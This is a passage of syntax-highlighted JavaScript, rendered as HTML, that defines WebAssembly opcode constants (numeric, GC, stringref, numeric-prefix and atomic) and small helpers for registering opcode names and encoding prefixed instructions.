property">I32ShrU</span><span class="token operator">:</span> <span class="token number">0x76</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Rol</span><span class="token operator">:</span> <span class="token number">0x77</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32Ror</span><span class="token operator">:</span> <span class="token number">0x78</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Clz</span><span class="token operator">:</span> <span class="token number">0x79</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Ctz</span><span class="token operator">:</span> <span class="token number">0x7a</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Popcnt</span><span class="token operator">:</span> <span class="token number">0x7b</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Add</span><span class="token operator">:</span> <span class="token number">0x7c</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Sub</span><span class="token operator">:</span> <span class="token number">0x7d</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Mul</span><span class="token operator">:</span> <span class="token number">0x7e</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64DivS</span><span class="token operator">:</span> <span class="token number">0x7f</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64DivU</span><span class="token operator">:</span> <span class="token number">0x80</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64RemS</span><span class="token operator">:</span> <span class="token number">0x81</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64RemU</span><span class="token operator">:</span> <span class="token number">0x82</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64And</span><span class="token operator">:</span> <span class="token number">0x83</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Ior</span><span class="token operator">:</span> <span class="token number">0x84</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Xor</span><span class="token operator">:</span> <span class="token number">0x85</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Shl</span><span class="token operator">:</span> <span class="token number">0x86</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64ShrS</span><span class="token operator">:</span> <span class="token number">0x87</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64ShrU</span><span class="token operator">:</span> <span class="token number">0x88</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Rol</span><span class="token operator">:</span> <span class="token number">0x89</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64Ror</span><span class="token operator">:</span> <span class="token number">0x8a</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Abs</span><span class="token operator">:</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Neg</span><span class="token operator">:</span> <span class="token number">0x8c</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Ceil</span><span class="token operator">:</span> <span class="token number">0x8d</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Floor</span><span class="token operator">:</span> <span class="token number">0x8e</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Trunc</span><span class="token operator">:</span> <span class="token number">0x8f</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32NearestInt</span><span class="token operator">:</span> <span class="token number">0x90</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Sqrt</span><span class="token operator">:</span> <span class="token number">0x91</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Add</span><span class="token operator">:</span> <span class="token number">0x92</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Sub</span><span class="token operator">:</span> <span class="token number">0x93</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Mul</span><span class="token operator">:</span> <span class="token number">0x94</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Div</span><span class="token operator">:</span> <span class="token number">0x95</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Min</span><span class="token operator">:</span> <span class="token number">0x96</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32Max</span><span class="token operator">:</span> <span class="token number">0x97</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32CopySign</span><span class="token operator">:</span> <span class="token number">0x98</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Abs</span><span class="token operator">:</span> <span class="token number">0x99</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Neg</span><span class="token operator">:</span> <span class="token number">0x9a</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Ceil</span><span class="token operator">:</span> <span class="token number">0x9b</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Floor</span><span class="token operator">:</span> <span class="token number">0x9c</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Trunc</span><span class="token operator">:</span> <span class="token number">0x9d</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64NearestInt</span><span class="token operator">:</span> <span class="token number">0x9e</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Sqrt</span><span class="token operator">:</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Add</span><span class="token operator">:</span> <span class="token number">0xa0</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Sub</span><span class="token operator">:</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Mul</span><span class="token operator">:</span> <span class="token number">0xa2</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Div</span><span class="token operator">:</span> <span class="token number">0xa3</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Min</span><span class="token operator">:</span> <span class="token number">0xa4</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64Max</span><span class="token operator">:</span> <span class="token number">0xa5</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64CopySign</span><span class="token operator">:</span> <span class="token number">0xa6</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32ConvertI64</span><span class="token operator">:</span> <span class="token number">0xa7</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32SConvertF32</span><span class="token operator">:</span> <span class="token number">0xa8</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32UConvertF32</span><span class="token operator">:</span> <span class="token number">0xa9</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32SConvertF64</span><span class="token operator">:</span> <span class="token number">0xaa</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32UConvertF64</span><span class="token operator">:</span> <span class="token number">0xab</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64SConvertI32</span><span class="token operator">:</span> <span class="token number">0xac</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64UConvertI32</span><span class="token operator">:</span> <span class="token number">0xad</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64SConvertF32</span><span class="token operator">:</span> <span class="token number">0xae</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64UConvertF32</span><span class="token operator">:</span> <span class="token number">0xaf</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64SConvertF64</span><span class="token operator">:</span> <span class="token number">0xb0</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64UConvertF64</span><span class="token operator">:</span> <span class="token number">0xb1</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32SConvertI32</span><span class="token operator">:</span> <span class="token number">0xb2</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32UConvertI32</span><span class="token operator">:</span> <span class="token number">0xb3</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32SConvertI64</span><span class="token operator">:</span> <span class="token number">0xb4</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32UConvertI64</span><span class="token operator">:</span> <span class="token number">0xb5</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32ConvertF64</span><span class="token operator">:</span> <span class="token number">0xb6</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64SConvertI32</span><span class="token operator">:</span> <span class="token number">0xb7</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64UConvertI32</span><span class="token operator">:</span> <span class="token number">0xb8</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64SConvertI64</span><span class="token operator">:</span> <span class="token number">0xb9</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64UConvertI64</span><span class="token operator">:</span> <span class="token number">0xba</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64ConvertF32</span><span class="token operator">:</span> <span class="token number">0xbb</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32ReinterpretF32</span><span class="token operator">:</span> <span class="token number">0xbc</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64ReinterpretF64</span><span class="token operator">:</span> <span class="token number">0xbd</span><span class="token punctuation">,</span>        <span class="token literal-property property">F32ReinterpretI32</span><span class="token operator">:</span> <span class="token number">0xbe</span><span class="token punctuation">,</span>        <span class="token literal-property property">F64ReinterpretI64</span><span class="token operator">:</span> <span class="token number">0xbf</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32SExtendI8</span><span class="token operator">:</span> <span class="token number">0xc0</span><span class="token punctuation">,</span>        <span class="token literal-property property">I32SExtendI16</span><span class="token operator">:</span> <span class="token number">0xc1</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64SExtendI8</span><span class="token operator">:</span> <span class="token number">0xc2</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64SExtendI16</span><span class="token operator">:</span> <span class="token number">0xc3</span><span class="token punctuation">,</span>        <span class="token literal-property property">I64SExtendI32</span><span class="token operator">:</span> <span class="token number">0xc4</span><span class="token punctuation">,</span>        <span class="token literal-property property">RefNull</span><span class="token operator">:</span> <span class="token number">0xd0</span><span class="token punctuation">,</span>        <span class="token literal-property property">RefIsNull</span><span class="token operator">:</span> <span class="token number">0xd1</span><span class="token punctuation">,</span>        <span class="token literal-property property">RefFunc</span><span class="token operator">:</span> <span class="token number">0xd2</span><span class="token punctuation">,</span>        <span class="token literal-property property">RefEq</span><span class="token operator">:</span> <span class="token number">0xd3</span><span class="token punctuation">,</span>        <span class="token literal-property property">RefAsNonNull</span><span class="token operator">:</span> <span class="token number">0xd4</span><span class="token punctuation">,</span>        <span class="token literal-property property">BrOnNull</span><span class="token operator">:</span> <span class="token number">0xd5</span><span class="token punctuation">,</span>        <span class="token literal-property property">BrOnNonNull</span><span class="token operator">:</span> <span class="token number">0xd6</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">function</span> <span class="token function">defineWasmOpcode</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">.</span>kWasmOpcodeNames <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          globalThis<span class="token punctuation">.</span>kWasmOpcodeNames <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>globalThis<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">value</span><span class="token operator">:</span> value <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">.</span>kWasmOpcodeNames<span class="token punctuation">[</span>value<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>            <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Duplicate wasm opcode: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">. Previous name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>globalThis<span class="token punctuation">.</span>kWasmOpcodeNames<span class="token punctuation">[</span>value<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, new name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>          <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        globalThis<span class="token punctuation">.</span>kWasmOpcodeNames<span class="token punctuation">[</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> name<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> name <span class="token keyword">in</span> kWasmOpcodes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">defineWasmOpcode</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">kExpr</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> kWasmOpcodes<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Prefix opcodes</span>      <span class="token keyword">const</span> kPrefixOpcodes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token constant">GC</span><span class="token operator">:</span> <span class="token number">0xfb</span><span class="token punctuation">,</span>        <span class="token literal-property property">Numeric</span><span class="token operator">:</span> <span class="token number">0xfc</span><span class="token punctuation">,</span>        <span class="token literal-property property">Simd</span><span class="token operator">:</span> <span class="token number">0xfd</span><span class="token punctuation">,</span>        <span class="token literal-property property">Atomic</span><span class="token operator">:</span> <span class="token number">0xfe</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> prefix <span class="token keyword">in</span> kPrefixOpcodes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">defineWasmOpcode</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">k</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>prefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">Prefix</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> kPrefixOpcodes<span class="token punctuation">[</span>prefix<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Use these for multi-byte instructions (opcode > 0x7F needing two LEB bytes):</span>      <span class="token keyword">function</span> <span class="token function">SimdInstr</span><span class="token punctuation">(</span><span class="token parameter">opcode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>opcode <span class="token operator">&lt;=</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> opcode<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>opcode <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> opcode <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">GCInstr</span><span class="token punctuation">(</span><span class="token parameter">opcode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>opcode <span class="token operator">&lt;=</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">[</span>kGCPrefix<span class="token punctuation">,</span> opcode<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>kGCPrefix<span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>opcode <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> opcode <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// GC opcodes</span>      <span class="token keyword">let</span> kExprStructNew <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStructNewDefault <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStructGet <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStructGetS <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStructGetU <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStructSet <span class="token operator">=</span> <span class="token number">0x05</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayNew <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayNewDefault <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayNewFixed <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayNewData <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayNewElem <span class="token operator">=</span> <span class="token number">0x0a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayGet <span class="token operator">=</span> <span class="token number">0x0b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayGetS <span class="token operator">=</span> <span class="token number">0x0c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayGetU <span class="token operator">=</span> <span class="token number">0x0d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArraySet <span class="token operator">=</span> <span class="token number">0x0e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayLen <span class="token operator">=</span> <span class="token number">0x0f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayFill <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayCopy <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayInitData <span class="token operator">=</span> <span class="token number">0x12</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprArrayInitElem <span class="token operator">=</span> <span class="token number">0x13</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprRefTest <span class="token operator">=</span> <span class="token number">0x14</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprRefTestNull <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprRefCast <span class="token operator">=</span> <span class="token number">0x16</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprRefCastNull <span class="token operator">=</span> <span class="token number">0x17</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprBrOnCastGeneric <span class="token operator">=</span> <span class="token number">0x18</span><span class="token punctuation">;</span> <span class="token comment">// TODO(14034): Drop "Generic" name.</span>      <span class="token keyword">let</span> kExprBrOnCastFailGeneric <span class="token operator">=</span> <span class="token number">0x19</span><span class="token punctuation">;</span> <span class="token comment">// TODO(14034): Drop "Generic" name.</span>      <span class="token keyword">let</span> kExprAnyConvertExtern <span class="token operator">=</span> <span class="token number">0x1a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprExternConvertAny <span class="token operator">=</span> <span class="token number">0x1b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprRefI31 <span class="token operator">=</span> <span class="token number">0x1c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI31GetS <span class="token operator">=</span> <span class="token number">0x1d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI31GetU <span class="token operator">=</span> <span class="token number">0x1e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprRefCastNop <span class="token operator">=</span> <span class="token number">0x4c</span><span class="token punctuation">;</span>      <span class="token comment">// Stringref proposal.</span>      <span class="token keyword">let</span> kExprStringNewUtf8 <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewWtf16 <span class="token operator">=</span> <span class="token number">0x81</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringConst <span class="token operator">=</span> <span class="token number">0x82</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringMeasureUtf8 <span class="token operator">=</span> <span class="token number">0x83</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringMeasureWtf8 <span class="token operator">=</span> <span class="token number">0x84</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringMeasureWtf16 <span class="token operator">=</span> <span class="token number">0x85</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEncodeUtf8 <span class="token operator">=</span> <span class="token number">0x86</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEncodeWtf16 <span class="token operator">=</span> <span class="token number">0x87</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringConcat <span class="token operator">=</span> <span class="token number">0x88</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEq <span class="token operator">=</span> <span class="token number">0x89</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringIsUsvSequence <span class="token operator">=</span> <span class="token number">0x8a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewLossyUtf8 <span class="token operator">=</span> <span class="token number">0x8b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewWtf8 <span class="token operator">=</span> <span class="token number">0x8c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEncodeLossyUtf8 <span class="token operator">=</span> <span class="token number">0x8d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEncodeWtf8 <span class="token operator">=</span> <span class="token number">0x8e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewUtf8Try <span class="token operator">=</span> <span class="token number">0x8f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringAsWtf8 <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf8Advance <span class="token operator">=</span> <span class="token number">0x91</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf8EncodeUtf8 <span class="token operator">=</span> <span class="token number">0x92</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf8Slice <span class="token operator">=</span> <span class="token number">0x93</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf8EncodeLossyUtf8 <span class="token operator">=</span> <span class="token number">0x94</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf8EncodeWtf8 <span class="token operator">=</span> <span class="token number">0x95</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringAsWtf16 <span class="token operator">=</span> <span class="token number">0x98</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf16Length <span class="token operator">=</span> <span class="token number">0x99</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf16GetCodeunit <span class="token operator">=</span> <span class="token number">0x9a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf16Encode <span class="token operator">=</span> <span class="token number">0x9b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewWtf16Slice <span class="token operator">=</span> <span class="token number">0x9c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringAsIter <span class="token operator">=</span> <span class="token number">0xa0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewIterNext <span class="token operator">=</span> <span class="token number">0xa1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewIterAdvance <span class="token operator">=</span> <span class="token number">0xa2</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewIterRewind <span class="token operator">=</span> <span class="token number">0xa3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringViewIterSlice <span class="token operator">=</span> <span class="token number">0xa4</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringCompare <span class="token operator">=</span> <span class="token number">0xa8</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringFromCodePoint <span class="token operator">=</span> <span class="token number">0xa9</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringHash <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewUtf8Array <span class="token operator">=</span> <span class="token number">0xb0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewWtf16Array <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEncodeUtf8Array <span class="token operator">=</span> <span class="token number">0xb2</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEncodeWtf16Array <span class="token operator">=</span> <span class="token number">0xb3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewLossyUtf8Array <span class="token operator">=</span> <span class="token number">0xb4</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewWtf8Array <span class="token operator">=</span> <span class="token number">0xb5</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEncodeLossyUtf8Array <span class="token operator">=</span> <span class="token number">0xb6</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringEncodeWtf8Array <span class="token operator">=</span> <span class="token number">0xb7</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprStringNewUtf8ArrayTry <span class="token operator">=</span> <span class="token number">0xb8</span><span class="token punctuation">;</span>      <span class="token comment">// Numeric opcodes.</span>      <span class="token keyword">let</span> kExprI32SConvertSatF32 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32UConvertSatF32 <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32SConvertSatF64 <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32UConvertSatF64 <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64SConvertSatF32 <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64UConvertSatF32 <span class="token operator">=</span> <span class="token number">0x05</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64SConvertSatF64 <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64UConvertSatF64 <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprMemoryInit <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprDataDrop <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprMemoryCopy <span class="token operator">=</span> <span class="token number">0x0a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprMemoryFill <span class="token operator">=</span> <span class="token number">0x0b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprTableInit <span class="token operator">=</span> <span class="token number">0x0c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprElemDrop <span class="token operator">=</span> <span class="token number">0x0d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprTableCopy <span class="token operator">=</span> <span class="token number">0x0e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprTableGrow <span class="token operator">=</span> <span class="token number">0x0f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprTableSize <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprTableFill <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>      <span class="token comment">// Atomic opcodes.</span>      <span class="token keyword">let</span> kExprAtomicNotify <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicWait <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicWait <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicLoad <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicLoad8U <span class="token operator">=</span> <span class="token number">0x12</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicLoad16U <span class="token operator">=</span> <span class="token number">0x13</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicStore <span class="token operator">=</span> <span class="token number">0x17</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicStore8U <span class="token operator">=</span> <span class="token number">0x19</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicStore16U <span class="token operator">=</span> <span class="token number">0x1a</span><span class="token punctuation">;</span>      <span class="token 